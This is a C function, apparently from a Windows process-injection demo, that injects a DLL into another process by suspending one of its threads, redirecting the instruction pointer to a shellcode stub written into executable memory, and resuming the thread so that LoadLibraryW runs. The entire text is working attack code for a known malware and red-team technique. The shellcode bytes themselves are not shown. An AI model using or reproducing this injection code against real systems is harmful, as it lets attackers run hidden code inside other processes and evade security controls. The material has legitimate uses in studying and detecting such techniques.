DWORD demoSuspendInjectResume64(PCWSTR pszLibFile, DWORD dwProcessId)
{
	void *stub;
	unsigned long threadID, oldprot;
	HANDLE hThread;
	CONTEXT ctx;

	DWORD64 stubLen = sizeof(sc);
	wprintf(TEXT("[+] Shellcode Length is: %d\n"), stubLen);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hProcess == NULL)
	{
		wprintf(L"[-] Error: Could not open process for PID (%d).\n", dwProcessId);
		return(1);
	}

	DWORD64 LoadLibraryAddress = (DWORD64)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (LoadLibraryAddress == NULL)
	{
		wprintf(L"[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n");
		exit(1);
	}

	SIZE_T dwSize = (wcslen(pszLibFile) + 1) * sizeof(wchar_t);

	LPVOID lpDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpDllAddr == NULL)
	{
		wprintf(L"[-] Error: Could not allocate memory inside PID (%d).\n", dwProcessId);
		exit(1);
	}

	stub = VirtualAllocEx(hProcess, NULL, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (stub == NULL)
	{
		wprintf(L"[-] Error: Could not allocate memory for stub.\n");
		exit(1);
	}

	SIZE_T nBytesWritten = 0;
	BOOL bStatus = WriteProcessMemory(hProcess, lpDllAddr, pszLibFile, dwSize, &nBytesWritten);
	if (bStatus == 0)
	{
		wprintf(L"[-] Error: Could not write any bytes into the PID (%d) address space.\n", dwProcessId);
		return(1);
	}
	if (nBytesWritten != dwSize)
		wprintf(TEXT("[-] Something is wrong!\n"));

	threadID = getThreadID(dwProcessId);
	hThread = OpenThread((THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME), false, threadID);
	if (hThread != NULL)
	{
		SuspendThread(hThread);
	}
	else
		wprintf(L"[-] Could not open thread\n");

	ctx.ContextFlags = CONTEXT_CONTROL;
	GetThreadContext(hThread, &ctx);

	DWORD64 oldIP = ctx.Rip;
	ctx.Rip = (DWORD64)stub;
	ctx.ContextFlags = CONTEXT_CONTROL;

	memcpy(sc + 3, &oldIP, sizeof(oldIP));
	memcpy(sc + 41, &lpDllAddr, sizeof(lpDllAddr));
	memcpy(sc + 51, &LoadLibraryAddress, sizeof(LoadLibraryAddress));

#ifdef _DEBUG
	wprintf(TEXT("[+] Shellcode Launcher Code:\n\t"));
	for (int i = 0; i < stubLen; i++)
		wprintf(TEXT("%02x "), sc[i]);
	wprintf(TEXT("\n"));
#endif

	WriteProcessMemory(hProcess, (void *)stub, &sc, stubLen, NULL);

	SetThreadContext(hThread, &ctx);
	ResumeThread(hThread);

	Sleep(8000);

	VirtualFreeEx(hProcess, lpDllAddr, dwSize, MEM_DECOMMIT);
	VirtualFreeEx(hProcess, stub, stubLen, MEM_DECOMMIT);
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return(0);
}